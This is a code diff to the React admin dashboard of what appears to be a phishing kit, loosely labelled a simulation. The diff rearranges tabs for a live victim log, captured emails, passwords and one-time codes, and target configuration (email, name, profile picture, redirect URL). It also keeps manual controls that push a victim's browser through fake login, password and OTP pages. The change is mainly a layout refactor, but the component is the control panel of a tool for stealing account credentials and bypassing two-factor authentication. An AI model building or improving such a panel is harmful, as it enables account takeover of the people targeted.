@@ -62,6 +62,13 @@ export function AdminDashboard() {
     formState: { errors },
   } = useForm<ConfigFormData>({
     resolver: zodResolver(configSchema),
+    defaultValues: {
+      targetEmail: '',
+      targetName: '',
+      targetProfilePicture: '',
+      redirectUrl: '',
+      attackMode: 'auto'
+    }
   });
 
   const profilePictureUrl = watch("targetProfilePicture");
@@ -209,9 +216,11 @@ export function AdminDashboard() {
     if (!state) return [];
     
     const log = [];
-    const { victim, config } = state;
+    const { victim } = state;
 
-    log.push({ icon: Eye, text: `Victim is viewing the phishing page.` });
+    if (!victim.email && Object.values(victim.passwords).length === 0 && !victim.otp) {
+        log.push({ icon: Eye, text: `Victim is viewing the phishing page.` });
+    }
 
     if (victim.email) {
       log.push({ icon: Mail, text: `Victim submitted email: ${victim.email}` });
@@ -241,66 +250,83 @@ export function AdminDashboard() {
   const attackLog = getAttackLog();
 
   return (
-    <div className="w-full max-w-4xl mx-auto">
+    <div className="w-full max-w-6xl mx-auto">
         <Tabs defaultValue="live" className="w-full">
-            <TabsList className="grid w-full grid-cols-4">
-                <TabsTrigger value="live">Live Dashboard</TabsTrigger>
-                <TabsTrigger value="data">Captured Data</TabsTrigger>
-                <TabsTrigger value="config">Target Config</TabsTrigger>
-                <TabsTrigger value="attackMode">Attack Mode</TabsTrigger>
-            </TabsList>
+            <div className="flex items-center justify-between mb-4">
+                <TabsList className="grid w-fit grid-cols-3">
+                    <TabsTrigger value="live">Live Dashboard</TabsTrigger>
+                    <TabsTrigger value="data">Captured Data</TabsTrigger>
+                    <TabsTrigger value="config">Configuration</TabsTrigger>
+                </TabsList>
+                <div className="flex items-center gap-2">
+                    <DropdownMenu>
+                      <DropdownMenuTrigger asChild>
+                        <Button variant="outline" size="icon">
+                          <Sun className="h-[1.2rem] w-[1.2rem] rotate-0 scale-100 transition-all dark:-rotate-90 dark:scale-0" />
+                          <Moon className="absolute h-[1.2rem] w-[1.2rem] rotate-90 scale-0 transition-all dark:rotate-0 dark:scale-100" />
+                          <span className="sr-only">Toggle theme</span>
+                        </Button>
+                      </DropdownMenuTrigger>
+                      <DropdownMenuContent align="end">
+                        <DropdownMenuItem onClick={() => setTheme("light")}>
+                          Light
+                        </DropdownMenuItem>
+                        <DropdownMenuItem onClick={() => setTheme("dark")}>
+                          Dark
+                        </DropdownMenuItem>
+                        <DropdownMenuItem onClick={() => setTheme("system")}>
+                          System
+                        </DropdownMenuItem>
+                      </DropdownMenuContent>
+                    </DropdownMenu>
+                    <Button variant="outline" size="icon" onClick={fetchState}><RefreshCw className="h-4 w-4" /></Button>
+                    <Button variant="outline" size="icon" onClick={handleClearVictimData}><UserX className="h-4 w-4" /></Button>
+                    <Button variant="destructive" size="icon" onClick={handleResetState}><Trash2 className="h-4 w-4" /></Button>
+                </div>
+            </div>
+
             <TabsContent value="live">
                 <Card>
-                  <CardHeader className="flex flex-row items-center justify-between">
-                    <div>
-                      <CardTitle>Live Attack Dashboard</CardTitle>
-                      <CardDescription>Real-time monitoring of the simulation.</CardDescription>
-                    </div>
-                    <div className="flex items-center gap-2">
-                        <DropdownMenu>
-                          <DropdownMenuTrigger asChild>
-                            <Button variant="outline" size="icon">
-                              <Sun className="h-[1.2rem] w-[1.2rem] rotate-0 scale-100 transition-all dark:-rotate-90 dark:scale-0" />
-                              <Moon className="absolute h-[1.2rem] w-[1.2rem] rotate-90 scale-0 transition-all dark:rotate-0 dark:scale-100" />
-                              <span className="sr-only">Toggle theme</span>
-                            </Button>
-                          </DropdownMenuTrigger>
-                          <DropdownMenuContent align="end">
-                            <DropdownMenuItem onClick={() => setTheme("light")}>
-                              Light
-                            </DropdownMenuItem>
-                            <DropdownMenuItem onClick={() => setTheme("dark")}>
-                              Dark
-                            </DropdownMenuItem>
-                            <DropdownMenuItem onClick={() => setTheme("system")}>
-                              System
-                            </DropdownMenuItem>
-                          </DropdownMenuContent>
-                        </DropdownMenu>
-                        <Button variant="outline" size="icon" onClick={fetchState}><RefreshCw className="h-4 w-4" /></Button>
-                        <Button variant="outline" size="icon" onClick={handleClearVictimData}><UserX className="h-4 w-4" /></Button>
-                        <Button variant="destructive" size="icon" onClick={handleResetState}><Trash2 className="h-4 w-4" /></Button>
-                    </div>
+                  <CardHeader>
+                    <CardTitle>Live Attack Dashboard</CardTitle>
+                    <CardDescription>Real-time monitoring of the simulation.</CardDescription>
                   </CardHeader>
-                  <CardContent className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                    <div className="space-y-6">
-                      <div>
-                        <h3 className="font-semibold mb-2">Victim Status</h3>
+                  <CardContent className="space-y-8">
+                     <div className="space-y-4">
+                        <h3 className="font-semibold text-lg">Victim Status</h3>
                         <div className="flex items-center gap-4 p-4 bg-muted rounded-lg">
                           <div className="flex items-center gap-2">Current Page: <Badge>{state?.victim.currentPage || 'N/A'}</Badge></div>
                           <div className="flex items-center gap-2">Attempts: <Badge variant="secondary">{state?.victim.attempts || 0}</Badge></div>
-                           <div className="flex items-center gap-2">Attack Mode: <Badge variant="outline">{state?.config.attackMode || 'N/A'}</Badge></div>
+                          <div className="flex items-center gap-2">Attack Mode: <Badge variant="outline">{state?.config.attackMode || 'N/A'}</Badge></div>
                         </div>
-                      </div>
-                      <Separator />
-                      <div>
-                          <h3 className="font-semibold mb-2">Live Controls</h3>
-                          <CardDescription className="mb-4">Force the victim's browser to a specific page. (Manual Mode Only)</CardDescription>
-                          <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
+                     </div>
+                     <Separator />
+                     <div className="space-y-4">
+                        <h3 className="font-semibold text-lg">Live Attack Log</h3>
+                        <div className="p-4 bg-muted rounded-lg min-h-[150px] space-y-3">
+                           {attackLog.length > 0 ? (
+                            attackLog.map((log, index) => (
+                               <div key={index} className="flex items-center gap-3 text-sm">
+                                <log.icon className="h-5 w-5 text-muted-foreground" />
+                                <span>{log.text}</span>
+                               </div>
+                            ))
+                           ) : (
+                             <div className="flex h-full min-h-[120px] items-center justify-center text-sm text-muted-foreground">
+                                Waiting for victim...
+                             </div>
+                           )}
+                        </div>
+                    </div>
+                     <Separator />
+                      <div className="space-y-4">
+                          <h3 className="font-semibold text-lg">Manual Controls</h3>
+                          <CardDescription className="mb-4">Force the victim's browser to a specific page. This only works when in "Manual" attack mode.</CardDescription>
+                          <div className="grid grid-cols-3 sm:grid-cols-6 gap-2">
                               <Button 
                                 variant={state?.victim.currentPage === 'login' ? "default" : "outline"}
                                 onClick={() => handleControlClick('login')}
-                                className={cn(state?.victim.currentPage === 'login' && "animate-shine")}
+                                className={cn("h-12", state?.victim.currentPage === 'login' && "animate-shine")}
                                 disabled={state?.config.attackMode === 'auto'}
                               >
                                 Login
@@ -308,7 +334,7 @@ export function AdminDashboard() {
                               <Button 
                                 variant={state?.victim.currentPage === 'password' ? "default" : "outline"}
                                 onClick={() => handleControlClick('password')}
-                                className={cn(state?.victim.currentPage === 'password' && "animate-shine")}
+                                className={cn("h-12", state?.victim.currentPage === 'password' && "animate-shine")}
                                  disabled={state?.config.attackMode === 'auto'}
                               >
                                 Password
@@ -316,7 +342,7 @@ export function AdminDashboard() {
                               <Button 
                                 variant={state?.victim.currentPage === 'pwCatch' ? "default" : "outline"}
                                 onClick={() => handleControlClick('pwCatch')}
-                                className={cn(state?.victim.currentPage === 'pwCatch' && "animate-shine")}
+                                className={cn("h-12", state?.victim.currentPage === 'pwCatch' && "animate-shine")}
                                  disabled={state?.config.attackMode === 'auto'}
                               >
                                 Pw-Catch
@@ -324,7 +350,7 @@ export function AdminDashboard() {
                               <Button 
                                 variant={state?.victim.currentPage === 'verify' ? "default" : "outline"}
                                 onClick={() => handleControlClick('verify')}
-                                className={cn(state?.victim.currentPage === 'verify' && "animate-shine")}
+                                className={cn("h-12", state?.victim.currentPage === 'verify' && "animate-shine")}
                                  disabled={state?.config.attackMode === 'auto'}
                               >
                                 Verify
@@ -332,7 +358,7 @@ export function AdminDashboard() {
                               <Button 
                                 variant={state?.victim.currentPage === 'otp' ? "default" : "outline"}
                                 onClick={() => handleControlClick('otp')}
-                                className={cn(state?.victim.currentPage === 'otp' && "animate-shine")}
+                                className={cn("h-12", state?.victim.currentPage === 'otp' && "animate-shine")}
                                  disabled={state?.config.attackMode === 'auto'}
                               >
                                 OTP
@@ -340,31 +366,13 @@ export function AdminDashboard() {
                               <Button 
                                 variant={state?.victim.currentPage === 'redirect' ? "default" : "outline"}
                                 onClick={() => handleControlClick('redirect')}
-                                className={cn(state?.victim.currentPage === 'redirect' && "animate-shine")}
+                                className={cn("h-12", state?.victim.currentPage === 'redirect' && "animate-shine")}
                                  disabled={state?.config.attackMode === 'auto'}
                               >
                                 Redirect
                               </Button>
                           </div>
                       </div>
-                    </div>
-                    <div>
-                        <h3 className="font-semibold mb-2">Live Attack Log</h3>
-                        <div className="p-4 bg-muted rounded-lg h-full space-y-3">
-                           {attackLog.length > 0 ? (
-                            attackLog.map((log, index) => (
-                               <div key={index} className="flex items-center gap-2 text-sm">
-                                <log.icon className="h-4 w-4 text-muted-foreground" />
-                                <span>{log.text}</span>
-                               </div>
-                            ))
-                           ) : (
-                             <div className="flex items-center justify-center text-sm text-muted-foreground h-full">
-                                Waiting for victim...
-                             </div>
-                           )}
-                        </div>
-                    </div>
                   </CardContent>
                 </Card>
             </TabsContent>
@@ -374,38 +382,78 @@ export function AdminDashboard() {
                     <CardTitle>Captured Data</CardTitle>
                     <CardDescription>All data captured from the victim during the simulation.</CardDescription>
                   </CardHeader>
-                  <CardContent>
-                    <div className="space-y-4">
-                      <div className="p-4 bg-muted rounded-lg">
-                        <div className="font-mono text-sm">
-                          <strong>Email:</strong> {state?.victim.email || "---"}
+                  <CardContent className="space-y-6">
+                    <div className="space-y-2">
+                        <Label>Email Address</Label>
+                        <div className="p-4 bg-muted rounded-lg font-mono text-sm">
+                           {state?.victim.email || "---"}
                         </div>
-                      </div>
-                      <div className="p-4 bg-muted rounded-lg space-y-2">
-                        <div className="font-mono text-sm"><strong>Passwords:</strong></div>
+                    </div>
+                    <div className="space-y-2">
+                        <Label>Captured Passwords</Label>
+                        <div className="p-4 bg-muted rounded-lg space-y-2">
                         {state?.victim.passwords && Object.values(state.victim.passwords).length > 0 ? (
                           <ul className="list-disc list-inside space-y-1">
                             {Object.values(state.victim.passwords).map((p, i) => <li key={i} className="font-mono text-sm">{p}</li>)}
                           </ul>
                         ) : <div className="font-mono text-sm">---</div>}
-                      </div>
-                       <div className="p-4 bg-muted rounded-lg">
-                        <div className="font-mono text-sm">
-                          <strong>OTP:</strong> {state?.victim.otp || "---"}
                         </div>
-                      </div>
+                    </div>
+                    <div className="space-y-2">
+                        <Label>One-Time Password (OTP)</Label>
+                       <div className="p-4 bg-muted rounded-lg font-mono text-sm">
+                          {state?.victim.otp || "---"}
+                        </div>
                     </div>
                   </CardContent>
               </Card>
             </TabsContent>
             <TabsContent value="config">
+                <form onSubmit={handleSubmit(onConfigSubmit)} className="grid md:grid-cols-2 gap-6">
+                 <Card>
+                    <CardHeader>
+                        <CardTitle>Attack Mode</CardTitle>
+                        <CardDescription>Select the simulation mode.</CardDescription>
+                    </CardHeader>
+                    <CardContent>
+                         <Controller
+                            name="attackMode"
+                            control={control}
+                            render={({ field }) => (
+                                <RadioGroup
+                                    onValueChange={field.onChange}
+                                    value={field.value}
+                                    className="grid grid-cols-1 gap-4"
+                                >
+                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer hover:bg-accent has-[input:checked]:bg-accent has-[input:checked]:border-accent-foreground/50">
+                                        <div className="flex items-center justify-between w-full">
+                                           <div className="font-semibold">Auto Mode</div>
+                                           <RadioGroupItem value="auto" id="auto" />
+                                        </div>
+                                        <p className="text-sm text-muted-foreground">
+                                            A streamlined flow: Email &rarr; Password &rarr; Redirect. Captures initial credentials then redirects.
+                                        </p>
+                                    </Label>
+                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer hover:bg-accent has-[input:checked]:bg-accent has-[input:checked]:border-accent-foreground/50">
+                                         <div className="flex items-center justify-between w-full">
+                                            <div className="font-semibold">Manual Mode</div>
+                                            <RadioGroupItem value="manual" id="manual" />
+                                         </div>
+                                        <p className="text-sm text-muted-foreground">
+                                           A multi-step, interactive flow that you control from the dashboard. Good for complex scenarios.
+                                        </p>
+                                    </Label>
+                                </RadioGroup>
+                            )}
+                         />
+                    </CardContent>
+                 </Card>
                 <Card>
                   <CardHeader>
                     <CardTitle>Target Configuration</CardTitle>
                     <CardDescription>Set up the target and simulation parameters.</CardDescription>
                   </CardHeader>
-                  <CardContent>
-                    <form onSubmit={handleSubmit(onConfigSubmit)} className="space-y-4">
+                  <CardContent className="space-y-4">
                       <div>
                         <Label htmlFor="targetEmail">Target Email</Label>
                         <Input id="targetEmail" {...register("targetEmail")} />
@@ -444,90 +492,14 @@ export function AdminDashboard() {
                         <Input id="redirectUrl" {...register("redirectUrl")} />
                         {errors.redirectUrl && <p className="text-sm text-destructive mt-1">{errors.redirectUrl.message}</p>}
                       </div>
-                       <Controller
-                          name="attackMode"
-                          control={control}
-                          render={({ field }) => (
-                           <input type="hidden" {...field} />
-                          )}
-                        />
-                      <Button type="submit" className="w-full" disabled={isUploading}>
-                        {isUploading ? "Uploading..." : "Save Configuration"}
-                      </Button>
-                    </form>
                   </CardContent>
                 </Card>
-            </TabsContent>
-            <TabsContent value="attackMode">
-                 <Card>
-                    <CardHeader>
-                        <CardTitle>Attack Mode</CardTitle>
-                        <CardDescription>Select the simulation mode.</CardDescription>
-                    </CardHeader>
-                    <CardContent>
-                       <form onSubmit={handleSubmit(onConfigSubmit)} className="space-y-6">
-                         <Controller
-                            name="attackMode"
-                            control={control}
-                            render={({ field }) => (
-                                <RadioGroup
-                                    onValueChange={field.onChange}
-                                    value={field.value}
-                                    className="grid grid-cols-1 md:grid-cols-2 gap-4"
-                                >
-                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer hover:bg-accent has-[input:checked]:bg-accent">
-                                        <div className="flex items-center justify-between w-full">
-                                           <div className="font-semibold">Auto Mode</div>
-                                           <RadioGroupItem value="auto" id="auto" />
-                                        </div>
-                                        <p className="text-sm text-muted-foreground">
-                                            A streamlined flow: Email &rarr; Password &rarr; Redirect. Captures initial credentials then redirects.
-                                        </p>
-                                    </Label>
-                                    <Label className="flex flex-col items-start gap-3 rounded-lg border p-4 cursor-pointer hover:bg-accent has-[input:checked]:bg-accent">
-                                         <div className="flex items-center justify-between w-full">
-                                            <div className="font-semibold">Manual Mode</div>
-                                            <RadioGroupItem value="manual" id="manual" />
-                                         </div>
-                                        <p className="text-sm text-muted-foreground">
-                                           A multi-step, interactive flow that you control from the dashboard. Good for complex scenarios.
-                                        </p>
-                                    </Label>
-                                </RadioGroup>
-                            )}
-                         />
-                          <Controller
-                            name="targetEmail"
-                            control={control}
-                            render={({ field }) => (
-                            <input type="hidden" {...field} />
-                            )}
-                          />
-                          <Controller
-                            name="targetName"
-                            control={control}
-                            render={({ field }) => (
-                            <input type="hidden" {...field} />
-                            )}
-                          />
-                          <Controller
-                            name="targetProfilePicture"
-                            control={control}
-                            render={({ field }) => (
-                            <input type="hidden" {...field} />
-                            )}
-                          />
-                          <Controller
-                            name="redirectUrl"
-                            control={control}
-                            render={({ field }) => (
-                            <input type="hidden" {...field} />
-                            )}
-                          />
-                         <Button type="submit" className="w-full">Save Attack Mode</Button>
-                       </form>
-                    </CardContent>
-                 </Card>
+                 <div className="md:col-span-2">
+                    <Button type="submit" className="w-full h-12" disabled={isUploading}>
+                        {isUploading ? "Uploading..." : "Save Configuration"}
+                    </Button>
+                 </div>
+                </form>
             </TabsContent>
         </Tabs>
     </div>
